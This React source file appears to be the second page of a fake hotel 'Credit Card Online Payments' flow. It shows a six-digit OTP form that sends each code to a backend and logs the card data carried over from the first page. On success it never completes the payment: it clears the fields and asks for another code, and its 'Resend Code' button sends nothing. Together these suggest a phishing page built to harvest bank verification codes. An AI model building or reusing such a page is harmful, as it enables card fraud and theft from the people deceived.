import React, { useState, useEffect } from "react";
import { Lock, ArrowLeft } from "lucide-react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";

// Page 2: OTP Verification
const OtpPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const cardData = location.state || {};

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [isResending, setIsResending] = useState(false);
  const [isAnimating, setIsAnimating] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const inputRefs = [
    React.createRef(),
    React.createRef(),
    React.createRef(),
    React.createRef(),
    React.createRef(),
    React.createRef(),
  ];

  useEffect(() => {
    console.log("OtpPage cardData:", cardData);
  }, [cardData]);

  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);
    setError("");

    if (value && index < 5) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 6);
    const newOtp = pastedData.split("");

    while (newOtp.length < 6) {
      newOtp.push("");
    }

    setOtp(newOtp);
    if (pastedData.length === 6) {
      inputRefs[5].current?.focus();
    }
  };

  const handleResend = () => {
    setIsResending(true);
    setTimeout(() => {
      setIsResending(false);
      setOtp(["", "", "", "", "", ""]);
      inputRefs[0].current?.focus();
    }, 1500);
  };

  const handleSubmit = async (e) => {
    const otpValue = otp.join("");
    console.log("OtpPage submit:", { otp: otpValue, cardData });

    if (otpValue.length < 6) {
      setError("Please enter complete 6-digit code");
      return;
    }

    setIsSubmitting(true);
    try {
      await axios.post(`${BASE_URL}/otp`, { otp: otpValue });
      setOtp(["", "", "", "", "", ""]);
      setError("");
      inputRefs[0].current?.focus();
    } catch (err) {
      console.error("OTP submission failed:", err);
      setError("Failed to verify code. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div
      className={`min-h-screen bg-gradient-to-br from-blue-50 via-white to-amber-50 flex flex-col transition-opacity duration-300 ${
        isAnimating ? "opacity-0" : "opacity-100"
      }`}
    >
      {/* Header */}
      <div className="bg-white shadow-sm border-b border-gray-100">
        <div className="max-w-md mx-auto px-6 py-4">
          <div className="flex items-center gap-4">
            <button
              onClick={() => navigate("/")}
              className="p-1 hover:bg-gray-100 rounded-lg transition-colors"
            >
              <ArrowLeft className="w-5 h-5 text-gray-600" />
            </button>
            <h1 className="text-xl font-semibold text-gray-900">
              Credit Card Online Payments
            </h1>
          </div>
        </div>
      </div>

      {/* Progress Bar */}
      <div className="max-w-md mx-auto px-6 pt-4 w-full">
        <div className="flex items-center gap-2">
          <div className="flex-1 h-1 bg-blue-600 rounded-full"></div>
          <div className="flex-1 h-1 bg-blue-600 rounded-full"></div>
          <div className="flex-1 h-1 bg-gray-200 rounded-full"></div>
        </div>
        <div className="flex justify-between mt-2">
          <span className="text-xs text-gray-400">Payment</span>
          <span className="text-xs font-medium text-blue-600">Verify</span>
          <span className="text-xs text-gray-400">Complete</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-6 py-12">
        <div className="w-full max-w-md">
          {/* Icon */}
          <div className="flex justify-center mb-8">
            <div className="relative">
              <div className="w-24 h-24 bg-gradient-to-br from-blue-500 to-blue-600 rounded-full flex items-center justify-center shadow-lg">
                <Lock className="w-12 h-12 text-white" />
              </div>
              <div className="absolute -bottom-2 -right-2 w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
                <span className="text-white text-lg">✓</span>
              </div>
            </div>
          </div>

          <h2 className="text-3xl font-bold text-gray-900 text-center mb-3">
            Verify Your Payment
          </h2>
          <p className="text-gray-600 text-center mb-2">
            We've sent a 6-digit verification code to Phone number/Email
          </p>

          {cardData?.reservation && (
            <div className="bg-white rounded-2xl shadow-lg p-4 mb-8">
              <h3 className="text-sm font-semibold text-gray-700 mb-2 text-center">
                Reservation Summary
              </h3>
              <div className="space-y-2">
                <div className="flex justify-between">
                  <span className="text-gray-600">Room Type</span>
                  <span className="font-semibold text-gray-900">
                    {cardData.reservation.roomType}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Check-in</span>
                  <span className="font-semibold text-gray-900">
                    {cardData.reservation.checkIn}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Check-out</span>
                  <span className="font-semibold text-gray-900">
                    {cardData.reservation.checkOut}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Guests</span>
                  <span className="font-semibold text-gray-900">
                    {cardData.reservation.guests}
                  </span>
                </div>
              </div>
            </div>
          )}

          <div>
            <div
              className="flex gap-2 justify-center mb-6"
              onPaste={handlePaste}
            >
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={inputRefs[index]}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-12 h-14 sm:w-14 sm:h-16 text-center text-2xl font-bold text-black border-2 border-gray-300 rounded-xl focus:border-blue-500 focus:ring-4 focus:ring-blue-100 outline-none transition-all bg-white shadow-sm"
                />
              ))}
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
                <p className="text-red-600 text-sm text-center font-medium">
                  {error}
                </p>
              </div>
            )}

            <button
              onClick={handleSubmit}
              disabled={isSubmitting || otp.join("").length < 6}
              className={`w-full font-bold py-5 rounded-xl transition-all duration-200 shadow-lg text-lg ${
                otp.join("").length === 6
                  ? "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white hover:shadow-xl active:scale-95"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
            >
              {otp.join("").length === 6
                ? "Verify & Complete Payment"
                : "Enter 6-digit code"}
            </button>

            <div className="mt-6 text-center">
              <p className="text-sm text-gray-600 mb-2">
                Didn't receive the code?
              </p>
              <button
                onClick={handleResend}
                disabled={isResending}
                className="text-blue-600 font-semibold hover:text-blue-700 transition-colors disabled:text-gray-400"
              >
                {isResending ? "Sending..." : "Resend Code"}
              </button>
            </div>

            <div className="mt-8 bg-blue-50 border border-blue-100 rounded-xl p-4">
              <p className="text-xs text-blue-800 text-center">
                💡 The code expires in 5 minutes for your security
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
export default OtpPage;
